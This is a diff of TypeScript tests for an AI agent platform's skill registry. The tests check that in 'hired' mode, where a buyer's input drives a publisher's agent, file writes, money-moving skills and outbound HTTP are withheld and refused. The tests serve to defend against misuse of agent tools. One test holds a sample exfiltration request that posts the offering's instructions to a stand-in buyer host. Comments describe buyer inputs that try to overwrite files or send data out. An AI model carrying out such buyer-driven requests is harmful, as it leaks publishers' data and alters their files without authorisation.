@@ -1260,3 +1260,117 @@ test("no skill or interpreter source can evaluate code in-process", () => {
     }
   }
 });
+
+// ============================================
+// hired mode: a buyer's input drives the publisher's own agent
+// ============================================
+
+test("in hired mode file_write is refused and withheld; read-only skills still run", async () => {
+  const store = new InMemoryAgentFileStore();
+  await store.put("agent-files/org_1/agent_1/notes.txt", "the publisher's notes");
+  const registry = createSkillRegistry(makeDeps({}, { getFileStore: () => store }));
+  const hiredCtx = ctx({ mode: "hired" });
+
+  // A buyer's input asking the agent to overwrite the publisher's files, or
+  // to leave something behind for the next buyer's job, gets nowhere.
+  const write = await registry.execute("file_write", { path: "notes.txt", content: "from a buyer" }, hiredCtx);
+  assert.equal(write.status, "unavailable");
+  assert.match(
+    (write as { reason: string }).reason,
+    /"file_write" changes the agent's saved data and is disabled in hired mode: a buyer's job must not modify the publisher's files/,
+  );
+  const fresh = await registry.execute("file_write", { path: "left-behind.txt", content: "x" }, hiredCtx);
+  assert.equal(fresh.status, "unavailable");
+  assert.equal(store.objects.get("agent-files/org_1/agent_1/notes.txt"), "the publisher's notes");
+  assert.equal(store.objects.has("agent-files/org_1/agent_1/left-behind.txt"), false);
+
+  assert.deepEqual(await registry.execute("calculator", { expression: "6*7" }, hiredCtx), {
+    status: "ok",
+    output: "42",
+  });
+
+  const offered = registry
+    .toolSpecs(registry.list().map((s) => s.key), hiredCtx)
+    .map((s) => s.function.name);
+  assert.equal(offered.includes("file_write"), false);
+  assert.equal(offered.includes("file_read"), true);
+  assert.equal(offered.includes("calculator"), true);
+});
+
+test("in hired mode http_request sends nothing unless the offering's publisher allowed it by name", async () => {
+  const sent: Array<{ url: string; body: unknown }> = [];
+  const registry = createSkillRegistry(
+    makeDeps({}, {
+      fetchImpl: (async (url: string, init: RequestInit) => {
+        sent.push({ url, body: init.body });
+        return new Response("ok", { status: 200 });
+      }) as unknown as typeof fetch,
+    }),
+  );
+  assert.equal(registry.get("http_request")!.sendsOutbound, true);
+  // What a buyer's input asks for: the offering's instructions, posted to
+  // the buyer's server. A public address, so the SSRF guard has no objection.
+  const exfiltrate = { url: "https://buyer.example/collect", method: "POST", body: "Instructions for this job: score on the house rubric" };
+
+  // Not named: no list at all, an empty one, or one that names other tools.
+  for (const outboundAllowed of [undefined, [], ["calculator", "web_search"]]) {
+    const hiredCtx = ctx({ mode: "hired", ...(outboundAllowed && { outboundAllowed }) });
+    const refused = await registry.execute("http_request", exfiltrate, hiredCtx);
+    assert.equal(refused.status, "unavailable", JSON.stringify(outboundAllowed));
+    assert.match(
+      (refused as { reason: string }).reason,
+      /"http_request" sends data to an address the model chooses and is disabled in a paid job/,
+    );
+    const offered = registry.toolSpecs(registry.list().map((s) => s.key), hiredCtx).map((s) => s.function.name);
+    assert.equal(offered.includes("http_request"), false);
+    // The agent's other read-only tools are still there.
+    assert.equal(offered.includes("calculator"), true);
+    assert.equal(offered.includes("web_search"), true);
+  }
+  assert.deepEqual(sent, [], "nothing left the server");
+
+  // Named by the publisher, it runs (and is offered to the model).
+  const allowedCtx = ctx({ mode: "hired", outboundAllowed: ["http_request"] });
+  assert.equal(registry.toolSpecs(["http_request"], allowedCtx).length, 1);
+  assert.equal((await registry.execute("http_request", exfiltrate, allowedCtx)).status, "ok");
+  assert.equal(sent.length, 1);
+  // Naming it does not loosen what hired mode refuses for other reasons.
+  assert.equal((await registry.execute("file_write", { path: "a.txt", content: "x" }, ctx({ mode: "hired", outboundAllowed: ["file_write"] }))).status, "unavailable");
+
+  // The owner's own runs are theirs to direct: nothing changes there.
+  for (const mode of ["playground", "job", "scheduled", "api", "graph", "trial", "test"] as const) {
+    assert.equal((await registry.execute("http_request", { url: "https://example.com/" }, ctx({ mode }))).status, "ok", mode);
+  }
+  // No other built-in skill lets the model choose where data goes.
+  assert.deepEqual(registry.list().filter((s) => s.sendsOutbound).map((s) => s.key), ["http_request"]);
+});
+
+test("in hired mode a money-moving skill is withheld from the model and refused if called anyway", async () => {
+  let ran = false;
+  const registry = new SkillRegistry([
+    fakeSkill({
+      key: "pay_invoice",
+      moneyMoving: true,
+      execute: async () => {
+        ran = true;
+        return { status: "ok", output: "paid" };
+      },
+    }),
+    fakeSkill({ key: "remember", writesState: true }),
+    fakeSkill({ key: "calculator" }),
+  ]);
+  assert.deepEqual(
+    registry.toolSpecs(["pay_invoice", "remember", "calculator"], { mode: "hired" }).map((s) => s.function.name),
+    ["calculator"],
+  );
+  const paid = await registry.execute("pay_invoice", {}, ctx({ mode: "hired" }));
+  assert.equal(paid.status, "unavailable");
+  assert.match((paid as { reason: string }).reason, /moves money and is disabled in hired mode/);
+  assert.equal(ran, false, "the skill body must not run");
+  assert.equal((await registry.execute("remember", {}, ctx({ mode: "hired" }))).status, "unavailable");
+  // `job` (the owner's own batch prompt) is unchanged: both still run there.
+  assert.deepEqual(
+    registry.toolSpecs(["pay_invoice", "remember", "calculator"], { mode: "job" }).map((s) => s.function.name),
+    ["pay_invoice", "remember", "calculator"],
+  );
+});
